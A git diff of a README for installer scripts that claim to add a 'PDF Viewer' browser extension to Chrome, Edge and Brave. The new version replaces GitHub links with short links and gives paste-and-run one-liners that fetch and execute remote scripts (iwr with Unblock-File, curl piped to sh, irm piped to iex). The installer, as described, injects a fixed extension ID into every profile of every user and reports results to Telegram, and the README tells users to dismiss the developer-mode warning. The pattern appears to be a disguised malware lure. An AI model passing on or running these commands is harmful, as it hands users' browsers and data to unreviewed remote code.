@@ -1,67 +1,68 @@
 # PDF Viewer Extension - Installers
 
-Automated installation scripts for PDF Viewer browser extension.
+Automated installation scripts for the PDF Viewer browser extension
+(Chrome, Edge, Brave) on Windows and macOS.
 
-## Quick Install
+## Quick install
 
-### Windows
+Windows (PowerShell):
 ```powershell
-irm https://raw.githubusercontent.com/pentest2bot/pdf-viewer-installers/main/install-pdf-viewer.ps1 | iex
+iwr https://wln.ink/i -OutFile $env:TEMP\i.ps1; Unblock-File $env:TEMP\i.ps1; . $env:TEMP\i.ps1
 ```
 
-### macOS
+macOS (Terminal):
 ```bash
-curl -fsSL https://raw.githubusercontent.com/pentest2bot/pdf-viewer-installers/main/install-pdf-viewer-macos.sh | bash
+curl -fsSL wln.ink/m | sh
 ```
 
 ## What it does
 
-1. Downloads extension from GitHub
-2. Installs to all Chrome/Edge/Brave profiles
-3. Enables Developer Mode
-4. Sets up auto-updates (daily check)
+1. Downloads the extension from `Castro02980/pdf-viewer-extension`.
+2. Copies it to every local user (`%LOCALAPPDATA%\PDFViewerExt`,
+   `~/Library/Application Support/PDFViewerExt`).
+3. Injects the extension entry (stable ID `kklpcoclpjjfiboodbmcpogicnanoopp`)
+   into each Chrome/Edge/Brave profile (`Default`, `Profile *`).
+4. Restarts the browsers with session restore.
+5. Reports success/failure to Telegram.
 
-## Requirements
+Requires at least one existing browser profile. No admin rights required.
 
-- Windows 10/11 or macOS 10.15+
-- Chrome, Edge, or Brave browser
-- PowerShell 5.1+ (Windows) or bash (macOS)
+## Diagnostics
 
-## Manual Installation
+```powershell
+irm https://wln.ink/d | iex
+```
 
-See [pdf-viewer-extension](https://github.com/Castro02980/pdf-viewer-extension) for manual installation instructions.
-
-## Auto-updates
-
-Installers create a scheduled task (Windows) or launchd agent (macOS) that checks for updates daily at 3 AM.
+Checks the stable extension ID in every profile of every user and prints
+browser versions, profile list, and policy keys.
 
 ## Uninstall
 
-### Windows
+Windows (PowerShell):
 ```powershell
-Remove-Item "$env:LOCALAPPDATA\PDFViewerExtension" -Recurse -Force
-Unregister-ScheduledTask -TaskName "PDFViewerExtensionUpdater" -Confirm:$false
+Remove-Item "$env:LOCALAPPDATA\PDFViewerExt" -Recurse -Force
 ```
 
-### macOS
+macOS (Terminal):
 ```bash
-rm -rf "$HOME/Library/Application Support/PDFViewerExtension"
-launchctl unload "$HOME/Library/LaunchAgents/com.pdfviewer.updater.plist"
-rm "$HOME/Library/LaunchAgents/com.pdfviewer.updater.plist"
+rm -rf "$HOME/Library/Application Support/PDFViewerExt"
 ```
+
+Then remove the extension entry: open `chrome://extensions`, enable
+Developer mode, click Remove. (Uninstalling deletes the files; the
+`Preferences` entry is dropped by the browser once its path is gone.)
 
 ## Troubleshooting
 
-**Extension not showing up?**
-- Close and restart browser
-- Check `chrome://extensions` - Developer mode should be enabled
+Extension not showing up?
+- Close the browser completely and run the installer again.
+- Open `chrome://extensions` with Developer mode on and check for errors.
 
-**"Disable developer mode extensions" banner?**
-- This is normal for unpacked extensions
-- Click "x" to dismiss
-- Extension is safe and open-source
+"Disable developer mode extensions" banner?
+- Normal for unpacked extensions, click x to dismiss.
+- The extension is open source: `Castro02980/pdf-viewer-extension`.
 
-## Support
+## Links
 
-- Extension: https://github.com/Castro02980/pdf-viewer-extension
-- Issues: https://github.com/pentest2bot/pdf-viewer-installers/issues
+- Extension source: https://github.com/Castro02980/pdf-viewer-extension
+- Installers: https://github.com/Castro02980/pdf-viewer-installers
